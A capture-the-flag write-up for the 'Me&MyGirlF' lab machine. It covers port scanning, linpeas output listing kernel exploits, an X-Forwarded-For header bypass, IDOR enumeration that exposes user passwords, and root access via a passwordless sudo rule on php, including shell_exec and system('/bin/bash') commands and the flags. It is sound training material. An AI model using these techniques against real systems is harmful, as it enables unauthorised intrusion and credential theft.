# CTF 2. MeAndMyGirlF Refresh

### 1.0 Team Information

### 2.0 Introduction

* This involves the CTF Machine name ‘Me\&MyGirlF’.

### 3.0 Independent Challenges

#### 3.1 Target 1 (192.168.100.130)

#### 3.2 Network Service Enumeration

* Server IP Address
* Open PORTs
* IP Address (192.168.1.1)
* Port number (22,80,53,)

**Nmap Scan Result**

* Found these open ports in Nmap Scan.

#### 3.3 Enumeration

* Netdiscover
  * Used to discover hosts on networks
* TTL Value of OS identification.
  * Utilized PING to determine Time to Live (TTL) values for OS identification
  * The TTL Value 64 which means that its Linux.
* TheWhatWEB.
  * Employed a script to identify web services
* NSE.
* Fuzz the application.

**Hints**

* Fuzzing.\`
* -fc for filter content.
* Burpsuite listing.
* OS Enumeration.
  * Explored various Linux enumeration methods:
  * Scanned from the attacker machine.
  * Scanned from the victim machine with the user present in "Goodies."
  * In cases without internet access, employed a Python3 server or SSH for file transfer.
  * In some cases the Machine doesn’t have internet so the python http.server can be used or Ssh ssh filename user@ip:/path
* Python3 Hosted
* LinePeas
  * RED/YELLOW Highlights

<details>

<summary>Additional Details</summary>

```
login as: alice

alice@192.168.171.132's password:

Last login: Thu Nov 23 14:26:37 2023 from 192.168.171.128

alice@gfriEND:~$ cd tm

-bash: cd: tm: No such file or directory

alice@gfriEND:~$ cd ..

alice@gfriEND:/home$ cd ..

alice@gfriEND:/$ cd tmp/

alice@gfriEND:/tmp$ l

linpeas_linux_amd64*  linux-smart-enumeration  tmux-1000/

alice@gfriEND:/tmp$ ls

linpeas_linux_amd64  linux-smart-enumeration  tmux-1000

alice@gfriEND:/tmp$ ./linpeas_linux_amd64

/---------------------------------------------------------------------------------\

|                             Do you like PEASS?                                  |

|---------------------------------------------------------------------------------|

|         Get the latest version    :     https://github.com/sponsors/carlospolop |

|         Follow on Twitter         :     @hacktricks_live                        |

|         Respect on HTB            :     SirBroccoli                             |

|---------------------------------------------------------------------------------|

|                                 Thank you!                                      |

\---------------------------------------------------------------------------------/

linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

LEGEND:

RED/YELLOW: 95% a PE vector

RED: You should take a look to it

LightCyan: Users with console

Blue: Users without console & mounted devs

Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)

LightMagenta: Your username

Starting linpeas. Caching Writable Folders...

╔═══════════════════╗

═══════════════════════════════╣ Basic information ╠═══════════════════════════════

╚═══════════════════╝

OS: Linux version 4.4.0-142-generic (buildd@lcy01-amd64-006) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.4) ) #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019

User & Groups: uid=1000(alice) gid=1001(alice) groups=1001(alice)

Hostname: gfriEND

Writable folder: /run/shm

[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)

[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)

[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories DONE

╔════════════════════╗

══════════════════════╣ System Information ╠══════════════════════

╚════════════════════╝

╔══════════╣ Operative system

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits

Linux version 4.4.0-142-generic (buildd@lcy01-amd64-006) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.4) ) #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019

Distributor ID: Ubuntu

Description:    Ubuntu 14.04.6 LTS

Release:        14.04

Codename:       trusty

╔══════════╣ Sudo version

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version

Sudo version 1.8.9p5

╔══════════╣ PATH

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime

Thu Nov 23 14:58:04 WIB 2023

14:58:04 up 36 min,  2 users,  load average: 0.15, 0.06, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

disk

sda

sda1

Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

Exposure: highly probable

Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}

Download URL: https://www.exploit-db.com/download/45010

Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-1000112] NETIF_F_UFO

Details: http://www.openwall.com/lists/oss-security/2017/08/13/1

Exposure: highly probable

Tags: [ ubuntu=14.04{kernel:4.4.0-*} ],ubuntu=16.04{kernel:4.8.0-*}

Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c

ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c

Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-5195] dirtycow

Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails

Exposure: highly probable

Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]

Download URL: https://www.exploit-db.com/download/40611

Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails

Exposure: highly probable

Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}

Download URL: https://www.exploit-db.com/download/40839

ext-url: https://www.exploit-db.com/download/40847

Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

Exposure: probable

Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro

Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

Exposure: probable

Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10

Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

Details: http://www.openwall.com/lists/oss-security/2017/02/22/3

Exposure: probable

Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}

Download URL: https://www.exploit-db.com/download/41458

Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-8655] chocobo_root

Details: http://www.openwall.com/lists/oss-security/2016/12/06/1

Exposure: probable

Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}

Download URL: https://www.exploit-db.com/download/40871

Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-2384] usb-midi

Details: https://xairy.github.io/blog/2016/cve-2016-2384

Exposure: probable

Tags: [ ubuntu=14.04 ],fedora=22

Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c

Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-3202] fuse (fusermount)

Details: http://seclists.org/oss-sec/2015/q2/520

Exposure: probable

Tags: debian=7.0|8.0,[ ubuntu=* ]

Download URL: https://www.exploit-db.com/download/37089

Comments: Needs cron or system admin interaction

[+] [CVE-2015-1318] newpid (apport)

Details: http://openwall.com/lists/oss-security/2015/04/14/4

Exposure: probable

Tags: [ ubuntu=14.04 ]

Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/

https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/

Exposure: less probable

Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}

Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c

Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

Details: https://www.openwall.com/lists/oss-security/2022/08/29/5

Exposure: less probable

Tags: ubuntu=(20.04){kernel:5.12.13}

Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1

Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

Exposure: less probable

Tags: mint=19,ubuntu=18|20, debian=10

Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html

Exposure: less probable

Tags: ubuntu=20.04{kernel:5.8.0-*}

Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c

Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/

Exposure: less probable

Tags: mint=19

Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c

Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc

Exposure: less probable

Download URL:

Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/

Exposure: less probable

Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}

Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c

Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html

Exposure: less probable

Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}

Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c

ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c

Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

Details: https://seclists.org/oss-sec/2017/q1/184

Exposure: less probable

Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt

Exposure: less probable

Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611

Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c

Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt

Exposure: less probable

Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}

Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793

Exposure: less probable

Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c

Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-4557] double-fdput()

Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

Exposure: less probable

Tags: ubuntu=16.04{kernel:4.4.0-21-generic}

Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip

Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2015-1318] newpid (apport) 2

Details: http://openwall.com/lists/oss-security/2015/04/14/4

Exposure: less probable

Tags: ubuntu=14.04.2

Download URL: https://www.exploit-db.com/download/36782

[+] [CVE-2016-0728] keyring

Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/

Exposure: less probable

Download URL: https://www.exploit-db.com/download/40003

Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

╔══════════╣ Executing Linux Exploit Suggester 2

╚ https://github.com/jondonas/linux-exploit-suggester-2

[1] af_packet

CVE-2016-8655

Source: http://www.exploit-db.com/exploits/40871

[2] exploit_x

CVE-2018-14665

Source: http://www.exploit-db.com/exploits/45697

[3] get_rekt

CVE-2017-16695

Source: http://www.exploit-db.com/exploits/45010

╔══════════╣ Files opened by processes belonging to other users

╚ This is usually empty because of the lack of privileges to read other user processes information

COMMAND     PID   TID       USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory

gdm-password Not Found

gnome-keyring-daemon Not Found

lightdm Not Found

vsftpd Not Found

apache2 process found (dump creds from memory as root)

sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs

/usr/bin/crontab

incrontab Not Found

-rw-r--r-- 1 root root     722 Feb  9  2013 /etc/crontab

/etc/cron.d:

total 16

drwxr-xr-x  2 root root 4096 Dec 13  2019 .

drwxr-xr-x 92 root root 4096 Nov 23  2023 ..

-rw-r--r--  1 root root  510 Apr 23  2019 php5

-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.daily:

total 76

drwxr-xr-x  2 root root  4096 Dec 13  2019 .

drwxr-xr-x 92 root root  4096 Nov 23  2023 ..

-rwxr-xr-x  1 root root   625 Apr  4  2019 apache2

-rwxr-xr-x  1 root root   376 Apr  4  2014 apport

-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt

-rwxr-xr-x  1 root root   314 Feb 18  2014 aptitude

-rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils

-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg

-rwxr-xr-x  1 root root   372 Jan 23  2014 logrotate

-rwxr-xr-x  1 root root  1261 Sep 23  2014 man-db

-rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate

-rwxr-xr-x  1 root root   249 Feb 17  2014 passwd

-rw-r--r--  1 root root   102 Feb  9  2013 .placeholder

-rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest

-rwxr-xr-x  1 root root   214 Mar 28  2017 update-notifier-common

-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart

/etc/cron.hourly:

total 12

drwxr-xr-x  2 root root 4096 Dec 13  2019 .

drwxr-xr-x 92 root root 4096 Nov 23  2023 ..

-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.monthly:

total 12

drwxr-xr-x  2 root root 4096 Dec 13  2019 .

drwxr-xr-x 92 root root 4096 Nov 23  2023 ..

-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.weekly:

total 28

drwxr-xr-x  2 root root 4096 Dec 13  2019 .

drwxr-xr-x 92 root root 4096 Nov 23  2023 ..

-rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index

-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim

-rwxr-xr-x  1 root root  771 Sep 23  2014 man-db

-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

-rwxr-xr-x  1 root root  211 Mar 28  2017 update-notifier-common

SHELL=/bin/sh

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly

25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )

47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )

52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths

╔══════════╣ Analyzing .service files

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services

You can't write on systemd PATH

╔══════════╣ System timers

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .timer files

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets

/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

/lib/systemd/system/dbus.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

Matching Defaults entries for alice on gfriEND:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:

(root) NOPASSWD: /usr/bin/php

╔════════════════╗

════════════════════════════════╣ API Keys Regex ╠════════════════════════════════

╚════════════════╝

Regexes to search for API keys aren't activated, use param '-r'

alice@gfriEND:/tmp$
```

</details>

* On the internet Stuff.

#### 3.4 Initials Access - (Vulnerably to IDOR).

* Vulnerability Explanation: Authentication failure.
* Vulnerability Fix:Apply Session managements
* Severity: Meduim.

#### Steps to Reproduce

{% stepper %}
{% step %}
### Identify the problem

* Got the hint above which says use the X-Forwarded-For.
{% endstep %}

{% step %}
### Analysed the issue

* Try to bypass Fail Or successful.
* Reapter
{% endstep %}

{% step %}
### Bypass with X-Forwarded-For

Adding a new rule which Add x-forwared-for:127.0.01 everything request is made.
{% endstep %}

{% step %}
### Access the application and enumerate the IDOR

There is a different webpage and its didn’t authenticate the User which is know as IDOR.

There is a registeration functionality

Logined using the registered credentials.

There is a UserID parameter in the Query.

In the profile section there is password visiblety.

By changing the ID parameter there is diifferent user credential visibly and there is no authentication for horizantoal Access Control.

Intruder Results.

Got the credentials which works are alice : 4lic3 (Added in the Goodies)
{% endstep %}
{% endstepper %}

#### 3.5 Privileged Escalation - (PHP used Root privileges without root authentication.)

* Vulnerability Explanation: the /bin/php is using root privilege when executed without authorization.
* Vulnerability Fix: its should asked for authentication before execution.
* Severity: critical.

#### Steps to Reproduce

{% stepper %}
{% step %}
### Exploited the analysed issue

* Gtfobins

`s udo -i" is used to execute commands with the privileges of the root user without having to switch to the root user account`
{% endstep %}

{% step %}
### Executed

```
alice@gfriEND:/$ sudo -ll

Matching Defaults entries for alice on gfriEND:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:

Sudoers entry:

RunAsUsers: root

Options: !authenticate

Commands:

/usr/bin/php

alice@gfriEND:/$
```

## Using the php to execute sudo code.

```
alice@gfriEND:/$ #-r for php execute

alice@gfriEND:/$

alice@gfriEND:/$

alice@gfriEND:/$ #-r for php execute

alice@gfriEND:/$ sudo /usr/bin/php -r 'echo shell_exec("whoami");'

root

alice@gfriEND:/$
```

```
alice@gfriEND:/$ #-r for php execute

alice@gfriEND:/$ sudo -r 'echo shell_exec("whoami");'

usage: sudo -h | -K | -k | -V

usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]

usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-u user] [command]

usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]

usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...

alice@gfriEND:/$ #-r for php execute

alice@gfriEND:/$

alice@gfriEND:/$

alice@gfriEND:/$ #-r for php execute

alice@gfriEND:/$ sudo /usr/bin/php -r 'echo shell_exec("whoami");'

root

alice@gfriEND:/$ sudo /usr/bin/php -r 'echo shell_exec("ls /root");'

flag2.txt

alice@gfriEND:/$ sudo /usr/bin/php -r 'echo shell_exec("cat /root/flag2.txt");'

________        __    ___________.__             ___________.__                ._.

/  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |

/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |

\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|

\______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__

\/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!

Twitter: @makegreatagain_

Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}

alice@gfriEND:/$
```
{% endstep %}
{% endstepper %}

* Links

#### 3.6 Post Exploitation (Local or Proof Flags).

* System proof Screenshot.
  * Final Proof Flags.

Got the flags 1 from the local user alice in the home directory.

Got the flag 2 from sudo misconfiured php.

```
alice@gfriEND:/$ sudo /usr/bin/php -r "system('$whoami');"

PHP Warning:  system(): Cannot execute a blank command in Command line code on line 1

alice@gfriEND:/$ sudo /usr/bin/php -r "system('/bin/bash');"

root@gfriEND:/# whoami

root

root@gfriEND:/# cd home

root@gfriEND:/home# cd..

cd..: command not found

root@gfriEND:/home# cd ..

root@gfriEND:/#

root@gfriEND:/# cd root/

root@gfriEND:/root# cat flag2.txt

________        __    ___________.__             ___________.__                ._.

/  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |

/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |

\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|

\______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__

\/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!

Twitter: @makegreatagain_

Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}

root@gfriEND:/root#
```

* Goodies.
  * Username : alice
  * Password : 4lic3

#### 3.7 Failed Attempted

* SearchSploit for Apache.
* Searchsploit for SSH

### Acknowledgement

Thanks to the challenge creator & Robensive for providing a realistic scenario that enhanced my skills in hacking.

<details>

<summary>Raw notes</summary>

sedihaingmah

cedihhihihi

alice

4lic3

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}

Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}

```
┌──(root㉿kali)-[~/MyandMyGirlF]

└─# cat nmap.txt

# Nmap 7.94SVN scan initiated Thu Aug 15 12:12:30 2024 as: nmap -p- -A -T4 -Pn -n -oN nmap.txt 192.168.14.129

Nmap scan report for 192.168.14.129

Host is up (0.00051s latency).

Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)

|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)

|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)

|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)

80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

|_http-server-header: Apache/2.4.7 (Ubuntu)

|_http-title: Site doesn't have a title (text/html).

MAC Address: 00:0C:29:49:67:39 (VMware)

Device type: general purpose

Running: Linux 3.X|4.X

OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4

OS details: Linux 3.2 - 4.9

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE

HOP RTT     ADDRESS

1   0.51 ms 192.168.14.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Aug 15 12:12:41 2024 -- 1 IP address (1 host up) scanned in 11.44 seconds
```

</details>
